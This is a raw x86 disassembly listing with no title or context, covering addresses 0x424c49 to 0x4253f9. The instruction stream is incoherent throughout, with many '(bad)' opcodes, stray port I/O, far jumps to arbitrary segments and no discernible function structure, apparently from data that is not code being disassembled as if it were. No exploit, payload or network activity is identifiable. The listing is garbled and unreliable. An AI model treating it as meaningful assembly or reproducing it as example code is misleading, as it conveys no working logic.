  424c49:	(bad)  
  424c4b:	adc    eax,DWORD PTR [ebx]
  424c4d:	mov    dl,0x69
  424c4f:	lahf   
  424c50:	jle    0x424c0d
  424c52:	xor    eax,0x9cdf3f4c
  424c57:	mov    edx,0xbe42e201
  424c5c:	mov    ebp,0x92066d69
  424c61:	sub    dh,BYTE PTR ds:0x4e9f3f0a
  424c67:	dec    edi
  424c68:	in     al,0x91
  424c6a:	jmp    0x7e13:0x36a9fd62
  424c71:	nop
  424c72:	xchg   esp,eax
  424c73:	push   es
  424c74:	scas   eax,DWORD PTR es:[edi]
  424c75:	aad    0x97
  424c77:	cmp    ah,BYTE PTR [esi]
  424c79:	sub    edi,DWORD PTR [edx]
  424c7b:	fcomp  DWORD PTR [edi+0x2d]
  424c7e:	loop   0x424cfb
  424c80:	loope  0x424cc6
  424c82:	jbe    0x424c63
  424c84:	mov    ebx,DWORD PTR [ebx+eiz*1+0x8]
  424c88:	adc    eax,0xab128283
  424c8d:	ds call 0xf8b4:0x72d55c30
  424c95:	mov    edi,0xe00529bb
  424c9a:	loopne 0x424c9b
  424c9c:	push   esp
  424c9d:	ja     0x424d02
  424c9f:	add    BYTE PTR [edx-0x234f10e3],bh
  424ca5:	pop    ebx
  424ca6:	aaa    
  424ca7:	das    
  424ca8:	cmp    eax,0x77b08ea0
  424cad:	scas   eax,DWORD PTR es:[edi]
  424cae:	xchg   esp,eax
  424caf:	std    
  424cb0:	add    DWORD PTR [esi],0xde9cf8ba
  424cb6:	outs   dx,BYTE PTR ds:[esi]
  424cb7:	int3   
  424cb8:	fwait
  424cb9:	imul   ebp,DWORD PTR [edi-0x1561c113],0x86ca385b
  424cc3:	cmp    ebx,ebp
  424cc5:	das    
  424cc6:	sbb    esi,esp
  424cc8:	add    eax,0x86d251b0
  424ccd:	(bad)  
  424ccf:	adc    al,0x63
  424cd1:	adc    al,0xc8
  424cd3:	inc    edx
  424cd4:	lea    esp,[ebx+0xc4d8e52]
  424cda:	lock bound eax,QWORD PTR ds:0xd9ef5586
  424ce1:	std    
  424ce2:	pop    ss
  424ce3:	mov    ds:0xe5f49e69,al
  424ce8:	mov    ds:0xc28a0263,al
  424ced:	or     DWORD PTR [ebp+0x3c0df514],ebx
  424cf3:	into   
  424cf4:	loop   0x424ce7
  424cf6:	loope  0x424cfc
  424cf8:	adc    ah,BYTE PTR [ebx-0x2ff1fc3a]
  424cfe:	jge    0x424d48
  424d00:	aam    0xcd
  424d02:	inc    edx
  424d03:	mov    ah,0x6b
  424d05:	imul   edi,DWORD PTR [ebp+0x24dfeff6],0xcbf03be2
  424d0f:	push   eax
  424d10:	retf   0x6339
  424d13:	mov    edx,0x44a833cc
  424d18:	mov    ds:0x9a877b4e,eax
  424d1d:	sahf   
  424d1e:	inc    eax
  424d1f:	inc    DWORD PTR [eax+0x18]
  424d22:	xlat   BYTE PTR ds:[ebx]
  424d23:	sbb    BYTE PTR [eax+ebp*1-0x3f],bl
  424d27:	dec    eax
  424d28:	jo     0x424d6d
  424d2a:	add    eax,edx
  424d2c:	nop
  424d2d:	lods   eax,DWORD PTR ds:[esi]
  424d2e:	loope  0x424ce2
  424d30:	mov    esi,0x7d3be730
  424d35:	xlat   BYTE PTR ds:[ebx]
  424d36:	dec    esi
  424d37:	pop    es
  424d38:	clc    
  424d39:	fstp   DWORD PTR [eax+edi*4+0x18109f0f]
  424d40:	(bad)  
  424d41:	xor    ebx,DWORD PTR [ecx-0x56]
  424d44:	jbe    0x424ce2
  424d46:	ja     0x424cf1
  424d48:	std    
  424d49:	cli    
  424d4a:	imul   ecx,DWORD PTR [edi-0x7726cb52],0x53
  424d51:	jmp    0x424d6f
  424d53:	jb     0x424cee
  424d55:	jmp    0x424d57
  424d57:	sub    bh,bh
  424d59:	pop    ds
  424d5a:	jle    0x424cf2
  424d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d5d:	retf   
  424d5e:	xor    eax,0xcf324e57
  424d63:	ret    
  424d64:	rol    DWORD PTR [esi-0x679827fc],cl
  424d6a:	scas   al,BYTE PTR es:[edi]
  424d6b:	mov    dh,0x95
  424d6d:	mov    ds:0x33a23617,eax
  424d72:	inc    esi
  424d73:	cmp    eax,0xb1e13ef4
  424d78:	fist   DWORD PTR [ebp+0x3bd9d863]
  424d7e:	inc    edx
  424d7f:	jg     0x424d13
  424d81:	and    BYTE PTR [edi+0x393fbd3b],ch
  424d87:	pop    ecx
  424d88:	icebp  
  424d89:	push   es
  424d8a:	dec    esp
  424d8b:	adc    ah,BYTE PTR [eax+0x12]
  424d8e:	cs retf 0xf60b
  424d92:	lock (bad) 
  424d94:	cs iret 
  424d96:	pop    ebp
  424d97:	xchg   ebx,eax
  424d98:	sub    cl,0x72
  424d9b:	fwait
  424d9c:	leave  
  424d9d:	sub    DWORD PTR [edi+ebx*2-0x39],ecx
  424da1:	fwait
  424da2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  424da4:	mov    WORD PTR [eax+0x6e],ss
  424da7:	retf   0x7bdb
  424daa:	pop    edi
  424dab:	adc    edx,DWORD PTR [esi]
  424dad:	es gs mov cl,0x45
  424db1:	adc    edx,DWORD PTR [ebp-0x1]
  424db4:	(bad)  
  424db6:	sar    BYTE PTR [edi+0x14e4a469],cl
  424dbc:	xor    edx,DWORD PTR [eax]
  424dbe:	push   esi
  424dbf:	xor    eax,ebp
  424dc1:	cli    
  424dc2:	cmp    BYTE PTR [esi+0x67515a80],ah
  424dc8:	repnz push 0x1d
  424dcb:	inc    ecx
  424dcc:	dec    edi
  424dcd:	mov    ?,WORD PTR [edx]
  424dcf:	popa   
  424dd0:	push   esp
  424dd1:	jne    0x424d93
  424dd3:	jl     0x424dd4
  424dd5:	stos   BYTE PTR es:[edi],al
  424dd6:	scas   eax,DWORD PTR es:[edi]
  424dd7:	hlt    
  424dd8:	call   0xcada:0x5b60750b
  424ddf:	addr16 adc eax,edx
  424de2:	jge    0x424e59
  424de4:	ror    BYTE PTR [esi],cl
  424de6:	cli    
  424de7:	mov    edi,0x36d7ebe6
  424dec:	mov    ss,WORD PTR [ecx+edi*2+0x2a5e82f0]
  424df3:	mov    edx,0x2943e915
  424df8:	mov    ebp,0x7b664dff
  424dfd:	or     esi,DWORD PTR [edi+ecx*2-0x39]
  424e01:	mov    dh,0x77
  424e03:	lock or eax,0x8033e2bb
  424e09:	jno    0x424e13
  424e0b:	pop    DWORD PTR [ecx]
  424e0d:	das    
  424e0e:	pop    ebp
  424e0f:	scas   al,BYTE PTR es:[edi]
  424e10:	xchg   ecx,eax
  424e11:	sub    esi,DWORD PTR [ebp-0x33a95312]
  424e17:	jp     0x424e4f
  424e19:	mov    ah,0xa5
  424e1b:	(bad)  
  424e1c:	mov    bl,0xdc
  424e1e:	loopne 0x424e24
  424e20:	cs pushw 0x3b
  424e24:	dec    eax
  424e25:	pop    bp
  424e27:	xor    BYTE PTR [eax+0x32],al
  424e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e2b:	mov    edx,DWORD PTR [ebp+0x0]
	...
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	lods   eax,DWORD PTR ds:[esi]
  424e47:	retf   
  424e48:	sbb    DWORD PTR [edi+0x1c65e],edx
  424e4e:	sti    
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [edi-0x66],ah
  424e54:	and    DWORD PTR [ecx+0x3f464650],0xa1846231
  424e5e:	out    0x36,eax
  424e60:	iret   
  424e61:	es sbb eax,0x56fa31b8
  424e67:	in     eax,0x30
  424e69:	test   al,0x2d
  424e6b:	jae    0x424ec1
  424e6d:	fst    st(3)
  424e6f:	or     dh,BYTE PTR [ebx-0x746e7369]
  424e75:	sub    edi,DWORD PTR [edx]
  424e77:	(bad)  
  424e78:	push   cs
  424e79:	mov    esi,0x9f0651b0
  424e7e:	rcl    BYTE PTR [ebx],0x3e
  424e81:	xor    BYTE PTR [edi+0x76],cl
  424e84:	jl     0x424ec6
  424e86:	push   ebx
  424e87:	(bad)  
  424e88:	popf   
  424e89:	mov    esp,0xc3392e33
  424e8e:	jmp    0xde36:0x7ff27757
  424e95:	aad    0xa8
  424e97:	sti    
  424e98:	mov    ah,0x25
  424e9a:	xor    al,0x49
  424e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e9d:	out    0x95,al
  424e9f:	out    0x1d,eax
  424ea1:	cli    
  424ea2:	pop    ebx
  424ea3:	push   esp
  424ea4:	xchg   edx,eax
  424ea5:	test   eax,0x2f629eda
  424eaa:	cmp    eax,DWORD PTR [edx+edi*2+0x67]
  424eae:	jb     0x424e8a
  424eb0:	enter  0x9ef8,0x9e
  424eb4:	fld    QWORD PTR [edi+eiz*8]
  424eb7:	lea    esi,[ecx+esi*1+0x11]
  424ebb:	aaa    
  424ebc:	push   ecx
  424ebd:	xchg   ebp,eax
  424ebe:	add    BYTE PTR [edx-0x72],ch
  424ec1:	push   ebp
  424ec2:	mov    cl,0x43
  424ec4:	pop    edx
  424ec5:	and    DWORD PTR [eax],edi
  424ec7:	stc    
  424ec8:	into   
  424ec9:	inc    ebx
  424eca:	das    
  424ecb:	jecxz  0x424e7a
  424ecd:	and    al,0xfa
  424ecf:	mov    ebx,0xb476082a
  424ed4:	aad    0xc3
  424ed6:	ror    DWORD PTR [edi+0x7f],cl
  424ed9:	cmp    bh,BYTE PTR [edx+0x62]
  424edc:	in     eax,0x22
  424ede:	neg    BYTE PTR [edx]
  424ee0:	and    DWORD PTR [edi+eax*4-0x252362d6],esp
  424ee7:	pop    edi
  424ee8:	js     0x424f3d
  424eea:	sahf   
  424eeb:	push   eax
  424eec:	jb     0x424eae
  424eee:	(bad)  
  424eef:	jne    0x424f33
  424ef1:	and    BYTE PTR [ebx+0x45cd73f],0x40
  424ef8:	das    
  424ef9:	in     eax,0x6a
  424efb:	and    DWORD PTR [ebp+0x4b2ca2b0],edi
  424f01:	out    0xec,eax
  424f03:	inc    BYTE PTR [ebx-0x5a]
  424f06:	push   esi
  424f07:	out    0xe0,al
  424f09:	fild   QWORD PTR [ecx-0x57]
  424f0c:	outs   dx,BYTE PTR ds:[esi]
  424f0d:	push   0xc756ee4c
  424f12:	xor    bl,BYTE PTR [eax-0x75]
  424f15:	push   ds
  424f16:	out    dx,al
  424f17:	xchg   ebx,eax
  424f18:	cs mov cl,0x86
  424f1b:	and    ah,cl
  424f1d:	xor    al,0x48
  424f1f:	jp     0x424ea3
  424f21:	or     al,0x48
  424f23:	cs sbb al,0xd4
  424f26:	cli    
  424f27:	mov    ds:0x78837584,eax
  424f2c:	xor    dh,cl
  424f2e:	loope  0x424f44
  424f30:	xor    al,0x94
  424f32:	fsub   DWORD PTR [ebp+0x4600d34c]
  424f38:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424f3a:	in     eax,0x47
  424f3c:	add    dh,BYTE PTR [ebx-0x30]
  424f3f:	add    bh,BYTE PTR [ecx+0x6]
  424f42:	scas   eax,DWORD PTR es:[edi]
  424f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f44:	cmp    DWORD PTR [esi],ecx
  424f46:	pop    ss
  424f47:	outs   dx,BYTE PTR ds:[esi]
  424f48:	push   ss
  424f49:	xchg   esp,eax
  424f4a:	and    al,0x59
  424f4c:	enter  0xc14d,0xc7
  424f50:	mov    ecx,0x342cd1e3
  424f55:	push   edi
  424f56:	in     al,dx
  424f57:	jecxz  0x424f30
  424f59:	pop    ecx
  424f5a:	and    ecx,eax
  424f5c:	dec    ebp
  424f5d:	aaa    
  424f5e:	sub    edi,DWORD PTR [edx-0x6f]
  424f61:	inc    ebx
  424f62:	(bad)  
  424f64:	fld    DWORD PTR [edi+0x2d]
  424f67:	cwde   
  424f68:	ins    BYTE PTR es:[edi],dx
  424f69:	aam    0x31
  424f6b:	fld    TBYTE PTR [ebp-0x6307f3cc]
  424f71:	mov    al,0x67
  424f73:	daa    
  424f74:	mov    ah,0xa6
  424f76:	jns    0x424f08
  424f78:	jae    0x424f49
  424f7a:	fcomp  QWORD PTR [esi+0x79]
  424f7d:	xchg   ebx,eax
  424f7e:	fistp  WORD PTR [edx-0x72bb9f80]
  424f84:	mov    ds:0xbb934531,eax
  424f89:	push   edi
  424f8a:	in     eax,dx
  424f8b:	or     eax,0xcca9191f
  424f90:	inc    ebp
  424f91:	xchg   ebp,eax
  424f92:	or     eax,DWORD PTR [esi-0x6948e666]
  424f98:	sbb    al,0xde
  424f9a:	imul   ebx,DWORD PTR [ebx+0x3b],0xffffffd8
  424f9e:	sbb    al,0x40
  424fa0:	test   DWORD PTR [edx],ebx
  424fa2:	(bad)  
  424fa3:	fwait
  424fa4:	pop    esi
  424fa5:	pop    edx
  424fa6:	inc    esp
  424fa7:	pop    edx
  424fa8:	inc    esi
  424fa9:	adc    bl,bl
  424fab:	cmp    ebp,0x18
  424fae:	sub    al,0x56
  424fb0:	mov    ecx,0x95c9fc67
  424fb5:	xchg   edi,eax
  424fb6:	pop    ss
  424fb7:	fcom   DWORD PTR [eax-0x638b39d7]
  424fbd:	cld    
  424fbe:	adc    ebp,DWORD PTR [edx-0x7d]
  424fc1:	daa    
  424fc2:	xlat   BYTE PTR ds:[ebx]
  424fc3:	(bad)  
  424fc4:	or     eax,0x165d6355
  424fc9:	ret    0x27f3
  424fcc:	jmp    0xa4f65d5
  424fd1:	pop    ebp
  424fd2:	ins    DWORD PTR es:[edi],dx
  424fd3:	pushf  
  424fd4:	clc    
  424fd5:	fisub  WORD PTR [ebx-0x76]
  424fd8:	add    edx,DWORD PTR [edx-0x67]
  424fdb:	int3   
  424fdc:	dec    eax
  424fdd:	shr    DWORD PTR [ecx-0x6b8adb5],cl
  424fe3:	int    0xbc
  424fe5:	popa   
  424fe6:	outs   dx,DWORD PTR ds:[esi]
  424fe7:	out    0x7e,al
  424fe9:	shr    DWORD PTR [ebx],cl
  424feb:	xchg   edx,eax
  424fec:	pop    ebp
  424fed:	test   dl,bl
  424fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ff0:	out    dx,eax
  424ff1:	xor    DWORD PTR [edx],eax
  424ff3:	ret    
  424ff4:	xor    cl,dh
  424ff6:	dec    edi
  424ff7:	ss lahf 
  424ff9:	test   eax,0x8d67675f
  424ffe:	sbb    al,0xc0
  425000:	mov    edx,0x7081bbd3
  425005:	int    0x21
  425007:	leave  
  425008:	ss fwait
  42500a:	mov    eax,0xaf448c92
  42500f:	out    0x18,al
  425011:	cli    
  425012:	jns    0x425000
  425014:	inc    eax
  425015:	xor    al,BYTE PTR [eax-0x38]
  425018:	sub    esp,DWORD PTR [ebx+ebp*4]
  42501b:	fidivr WORD PTR [ebp-0xa]
  42501e:	psrld  mm3,QWORD PTR ds:0x75a6
  425024:	fyl2xp1 
  425026:	inc    esi
  425027:	cmc    
  425028:	inc    ebx
  425029:	xor    DWORD PTR ds:0xd2919df6,0x298d1fa6
  425033:	jg     0x425023
  425035:	inc    esi
  425036:	dec    ebp
  425037:	cmp    ebp,DWORD PTR [ebx]
  425039:	inc    edx
  42503a:	sbb    ch,BYTE PTR [esi-0x71]
  42503d:	xlat   BYTE PTR ds:[ebx]
  42503e:	jl     0x425058
  425040:	push   eax
  425041:	aam    0x75
  425043:	je     0x425080
  425045:	xchg   esi,eax
  425046:	cmp    eax,0xa94943d
  42504b:	jmp    0x0:0xe0
	...
  42505a:	inc    ebx
  42505b:	lea    ebx,[edi]
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x5e
  425067:	fild   QWORD PTR [ecx+0x1c859ec]
  42506d:	add    bl,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [ecx+0x12fd225a],ah
  425077:	dec    ecx
  425078:	push   cs
  425079:	mov    dl,0x13
  42507b:	cmp    al,0xb8
  42507d:	mov    ecx,0xdac9edaa
  425082:	imul   edi,ecx,0xffffffbe
  425085:	fs pop edx
  425087:	ror    esp,1
  425089:	sti    
  42508a:	out    0x5f,al
  42508c:	out    0x57,al
  42508e:	lods   al,BYTE PTR ds:[esi]
  42508f:	loop   0x425086
  425091:	lods   al,BYTE PTR ds:[esi]
  425092:	jmp    0x984f:0x2de21ff7
  425099:	jp     0x425037
  42509b:	outs   dx,BYTE PTR ds:[esi]
  42509c:	adc    ch,bl
  42509e:	pop    edx
  42509f:	lds    eax,FWORD PTR [esi]
  4250a1:	nop
  4250a2:	pop    eax
  4250a3:	inc    edi
  4250a4:	test   eax,0xbf39962
  4250a9:	out    dx,al
  4250aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ab:	icebp  
  4250ac:	cli    
  4250ad:	aad    0xc1
  4250af:	int3   
  4250b0:	and    eax,0x86fe3f25
  4250b5:	(bad)  
  4250b6:	cld    
  4250b7:	mov    al,BYTE PTR [edx+eax*2]
  4250ba:	scas   al,BYTE PTR es:[edi]
  4250bb:	xchg   edx,eax
  4250bc:	bound  edx,QWORD PTR [edx+0x40f584bc]
  4250c2:	stos   DWORD PTR es:[edi],eax
  4250c3:	or     ah,BYTE PTR [edx+ebp*4+0x3bed0e9d]
  4250ca:	dec    ebp
  4250cb:	jb     0x4250f1
  4250cd:	push   es
  4250ce:	nop
  4250cf:	xchg   edi,eax
  4250d0:	or     al,0xaf
  4250d2:	je     0x4250bf
  4250d4:	repz mov dh,BYTE PTR [eax-0x35]
  4250d8:	pop    es
  4250d9:	outs   dx,BYTE PTR ds:[esi]
  4250da:	dec    ecx
  4250db:	pop    esi
  4250dc:	cmp    ebx,esi
  4250de:	test   BYTE PTR [ecx+esi*4],0x3d
  4250e2:	mov    esi,0xc3e421c7
  4250e7:	(bad)  
  4250e8:	or     bl,BYTE PTR [esi+0x6f9c7444]
  4250ee:	xchg   dh,ah
  4250f0:	push   esi
  4250f1:	sbb    dh,BYTE PTR [ebx-0x22]
  4250f4:	repz jecxz 0x4250d2
  4250f7:	jbe    0x4250f9
  4250f9:	mov    dl,0xcc
  4250fb:	int    0x77
  4250fd:	mov    ah,0xf0
  4250ff:	aad    0xae
  425101:	loop   0x425088
  425103:	pop    edx
  425104:	xchg   esi,eax
  425105:	fsubr  QWORD PTR [edi+0x6a]
  425108:	fist   DWORD PTR [ecx]
  42510a:	cld    
  42510b:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42510d:	popa   
  42510e:	mov    al,0xf8
  425110:	lods   eax,DWORD PTR ds:[esi]
  425111:	mov    cl,0x27
  425113:	adc    BYTE PTR [ebp+0x54],0x4
  425117:	xor    edx,DWORD PTR [ebp-0x20]
  42511a:	addr16 in eax,0x4
  42511d:	(bad)  
  42511e:	jl     0x42511f
  425120:	jmp    0x95d7593e
  425125:	and    esi,DWORD PTR [edi+0x7f]
  425128:	jno    0x42510d
  42512a:	mov    bh,0x4b
  42512c:	push   esi
  42512d:	data16 fmul DWORD PTR [edi]
  425130:	jno    0x425188
  425132:	les    esp,FWORD PTR [edi]
  425134:	hlt    
  425135:	sbb    DWORD PTR [ecx-0x39],esi
  425138:	nop
  425139:	mov    bh,0x2c
  42513b:	loopne 0x425193
  42513d:	add    BYTE PTR [ebx+0x5b],bl
  425140:	jg     0x42510c
  425142:	pop    ds
  425143:	(bad)  
  425144:	out    0x82,eax
  425146:	sub    ebp,eax
  425148:	and    eax,0xb674aa22
  42514d:	mov    eax,0xb32c386e
  425152:	mov    eax,0x39fe12d9
  425157:	jg     0x42510b
  425159:	int    0xdc
  42515b:	enter  0xcff3,0x76
  42515f:	mov    esi,0x204f8017
  425164:	push   esi
  425165:	sub    dl,BYTE PTR [ebp+0x1221b4cc]
  42516b:	neg    BYTE PTR [edi]
  42516d:	outs   dx,DWORD PTR ds:[esi]
  42516e:	in     eax,0x86
  425170:	inc    edx
  425171:	adc    BYTE PTR [ebx],dh
  425173:	xchg   edx,eax
  425174:	ins    DWORD PTR es:[edi],dx
  425175:	jae    0x42518b
  425177:	pmullw mm7,QWORD PTR [edx+eiz*8-0xd]
  42517c:	cli    
  42517d:	mov    dh,0x1c
  42517f:	add    DWORD PTR [edx-0x78],esp
  425182:	and    BYTE PTR [ebp-0x1fb971bd],dh
  425188:	push   ebp
  425189:	push   ecx
  42518a:	ja     0x425134
  42518c:	sub    BYTE PTR [esi-0x48],dh
  42518f:	dec    ebp
  425190:	push   cs
  425191:	adc    eax,0x553b1ddc
  425196:	dec    ecx
  425197:	int    0xd6
  425199:	test   DWORD PTR [edi],ecx
  42519b:	out    0x3b,al
  42519d:	mov    esp,0xf63f8206
  4251a2:	push   eax
  4251a3:	pop    eax
  4251a4:	in     al,dx
  4251a5:	stos   BYTE PTR es:[edi],al
  4251a6:	pop    ebp
  4251a7:	sti    
  4251a8:	mov    dh,0xb4
  4251aa:	lds    ebp,FWORD PTR [esi]
  4251ac:	cmp    al,0x48
  4251ae:	test   al,0x53
  4251b0:	ins    BYTE PTR es:[edi],dx
  4251b1:	sar    DWORD PTR [eax-0x2c],cl
  4251b4:	call   0x7fb8:0xa7f420f4
  4251bb:	ds jecxz 0x42517e
  4251be:	ins    DWORD PTR es:[edi],dx
  4251bf:	fcomp  st(7)
  4251c1:	loop   0x425157
  4251c3:	iret   
  4251c4:	mov    eax,ds:0xa0df90f6
  4251c9:	out    0xf1,al
  4251cb:	mov    ds,WORD PTR [edx]
  4251cd:	pop    edi
  4251ce:	xchg   esp,eax
  4251cf:	test   DWORD PTR [ecx],ecx
  4251d1:	push   ebx
  4251d2:	adc    al,0x8
  4251d4:	adc    eax,0x4f5be8e1
  4251d9:	in     al,dx
  4251da:	pop    eax
  4251db:	push   esp
  4251dc:	lea    ebp,[esi+0x1634a5b3]
  4251e2:	jb     0x425212
  4251e4:	vaddsubps ymm2,ymm7,YMMWORD PTR [edx+0x3e426e7b]
  4251ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ed:	add    eax,0x2fc6f455
  4251f2:	or     ah,BYTE PTR [ebx]
  4251f4:	sar    DWORD PTR [esp+ebp*8-0x5b3923aa],cl
  4251fb:	call   0x502b:0xc1c4c874
  425202:	ja     0x425210
  425204:	aaa    
  425205:	mov    ds:0x8e175fd8,al
  42520a:	pop    eax
  42520b:	mov    ecx,ebp
  42520d:	clc    
  42520e:	mov    eax,0x6abe9575
  425213:	sub    DWORD PTR [eax+edx*4-0x8],ebp
  425217:	sbb    edx,ecx
  425219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42521a:	sbb    al,0x3d
  42521d:	mov    ch,0x68
  42521f:	add    ah,BYTE PTR [edx]
  425221:	sub    BYTE PTR [edi],ah
  425223:	mov    ecx,0x781d93e0
  425228:	xchg   edx,eax
  425229:	push   ebp
  42522a:	icebp  
  42522b:	xchg   bl,dl
  42522d:	adc    bl,BYTE PTR [ebx-0x6]
  425230:	inc    esp
  425231:	loopne 0x425278
  425233:	sub    ebx,DWORD PTR [edx-0x1c]
  425236:	xor    al,0x4
  425238:	dec    esp
  425239:	jmp    DWORD PTR [eax-0x79]
  42523c:	out    dx,eax
  42523d:	ret    0x3781
  425240:	add    eax,0x6cd22e43
  425245:	mov    bl,0xa5
  425247:	ffree  st(3)
  425249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42524a:	test   al,0x2d
  42524c:	dec    ecx
  42524d:	daa    
  42524e:	sub    al,0x73
  425250:	cmp    cl,BYTE PTR [edi-0x5f]
  425253:	(bad)  
  425254:	hlt    
  425255:	push   eax
  425256:	fist   DWORD PTR [ebx+0x5]
  425259:	xor    eax,DWORD PTR [ebx-0x3346bf0d]
  42525f:	daa    
  425260:	mov    ebx,0x289121b9
  425265:	ror    cl,0xa1
  425268:	pop    es
  425269:	pop    esp
  42526a:	stos   DWORD PTR es:[edi],eax
  42526b:	xchg   edi,eax
  42526c:	mov    al,ds:0x0
	...
  425279:	add    ah,dh
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	imul   eax,DWORD PTR [ebp+0x57],0xffffffc8
  42528a:	push   esp
  42528b:	retf   0x1
  42528e:	sti    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [ebp-0x1a083033],bh
  425297:	pop    ds
  425298:	ret    0x822c
  42529b:	push   edi
  42529c:	popf   
  42529d:	push   cs
  42529e:	call   0xace18aab
  4252a3:	sub    DWORD PTR [ecx-0x25],edi
  4252a6:	cli    
  4252a7:	mov    dh,BYTE PTR [edx]
  4252a9:	and    al,ch
  4252ab:	lock cli 
  4252ad:	gs pop es
  4252af:	repnz aas 
  4252b1:	fwait
  4252b2:	adc    eax,0x2f93ab39
  4252b7:	mov    al,ds:0x28d02e0d
  4252bc:	cwde   
  4252bd:	push   eax
  4252be:	enter  0x6108,0x1f
  4252c2:	mov    ds:0x31f58f65,al
  4252c7:	js     0x42524d
  4252c9:	mov    ?,WORD PTR [ebp+0x15]
  4252cc:	adc    eax,0xa63198cd
  4252d1:	fimul  DWORD PTR [eax]
  4252d3:	cwde   
  4252d4:	fstp   TBYTE PTR [ebx+0x4c1d882c]
  4252da:	out    dx,al
  4252db:	jge    0x4252d4
  4252dd:	add    bl,cl
  4252df:	mov    dh,0x51
  4252e1:	add    bl,al
  4252e3:	or     ah,bh
  4252e5:	in     al,0x86
  4252e7:	dec    edi
  4252e8:	iret   
  4252e9:	adc    DWORD PTR [ecx-0x40fcdf2a],edi
  4252ef:	fdivr  DWORD PTR [edx+ebx*1]
  4252f2:	es gs add al,0xba
  4252f6:	pop    ds
  4252f7:	ins    BYTE PTR es:[edi],dx
  4252f8:	sbb    BYTE PTR [edx],0x95
  4252fb:	or     al,0x4c
  4252fd:	in     eax,0x98
  4252ff:	pop    edx
  425300:	jo     0x4252de
  425302:	scas   al,BYTE PTR es:[edi]
  425303:	sbb    BYTE PTR [ebx],ch
  425305:	out    0xde,eax
  425307:	sbb    al,BYTE PTR [ecx+edx*8]
  42530a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42530b:	addr16 xchg ebx,eax
  42530d:	or     DWORD PTR [ebp-0x2a9a85f1],ebx
  425313:	push   edi
  425314:	ret    
  425315:	jmp    0x1cc99646
  42531a:	in     eax,dx
  42531b:	sub    BYTE PTR cs:[ebx],0xb3
  42531f:	cmc    
  425320:	in     eax,dx
  425321:	call   0x3d61:0x81f8310e
  425328:	mov    al,ds:0x7eb5a74f
  42532d:	push   eax
  42532e:	jns    0x4252ca
  425330:	pop    ds
  425331:	icebp  
  425332:	mov    esi,0x976dc5d6
  425337:	sti    
  425338:	enter  0x31d9,0x2f
  42533c:	or     DWORD PTR [eax+0x5c],eax
  42533f:	pop    ss
  425340:	out    dx,al
  425341:	mul    BYTE PTR [ebx+eax*1]
  425344:	(bad)  
  425345:	push   ss
  425346:	sbb    BYTE PTR [edx-0x2bd40b02],al
  42534c:	test   eax,0xff5f7a0a
  425351:	push   ss
  425352:	std    
  425353:	sbb    al,0xc6
  425355:	aas    
  425356:	jbe    0x425363
  425358:	add    bh,BYTE PTR [eax+0x134f36b7]
  42535e:	push   ss
  42535f:	sub    al,0x3a
  425361:	xchg   edx,eax
  425362:	retf   
  425363:	adc    dh,BYTE PTR [ecx+0x21]
  425366:	outs   dx,BYTE PTR ds:[esi]
  425367:	lods   eax,DWORD PTR ds:[esi]
  425368:	clc    
  425369:	sub    DWORD PTR [edi+0x6beb4e2e],0xffffff82
  425370:	cli    
  425371:	fst    st(6)
  425373:	adc    DWORD PTR [ebx],edi
  425375:	push   eax
  425376:	int3   
  425377:	test   al,0x2
  425379:	(bad)  
  42537a:	fidiv  WORD PTR [edi]
  42537c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42537d:	xchg   ecx,eax
  42537e:	push   ss
  42537f:	rcr    BYTE PTR [ecx-0x474cb203],cl
  425385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425386:	(bad)
  42538b:	imul   esp,ebp,0x9
  42538e:	xchg   ebp,eax
  42538f:	leave  
  425390:	mov    dh,0xb9
  425392:	xor    eax,ecx
  425394:	sub    eax,0x629288d6
  425399:	pop    ebp
  42539a:	(bad)  
  42539b:	fstp   DWORD PTR [edx-0x34d9f38c]
  4253a1:	xor    bl,BYTE PTR [edi+0x7fe5a1ac]
  4253a7:	adc    BYTE PTR [ecx-0x2861e37e],0x88
  4253ae:	stos   BYTE PTR es:[edi],al
  4253af:	and    al,0x7d
  4253b1:	pop    ss
  4253b2:	xchg   ch,al
  4253b4:	jg     0x4253a9
  4253b6:	sbb    DWORD PTR [edx-0x652fe5df],edx
  4253bc:	jl     0x4253ad
  4253be:	xchg   ebx,eax
  4253bf:	mov    cs,WORD PTR cs:0x53dc570
  4253c6:	out    0xc3,eax
  4253c8:	dec    ebx
  4253c9:	push   edi
  4253ca:	adc    DWORD PTR ss:0x1137cb7b,ecx
  4253d1:	mov    WORD PTR [ecx+eax*4+0x2e],?
  4253d5:	jmp    0x3dec5e16
  4253da:	cmp    cl,BYTE PTR [esi-0x55313b21]
  4253e0:	mov    bh,0x2f
  4253e2:	loop   0x4253ec
  4253e4:	mov    edx,0xc1b25863
  4253e9:	das    
  4253ea:	out    dx,al
  4253eb:	dec    edx
  4253ec:	imul   esi,DWORD PTR [ebp+0x73],0xdb0b0be3
  4253f3:	pop    ebx
  4253f4:	mov    eax,ds:0x215d081c
  4253f9:	lea    esp,[ebx]
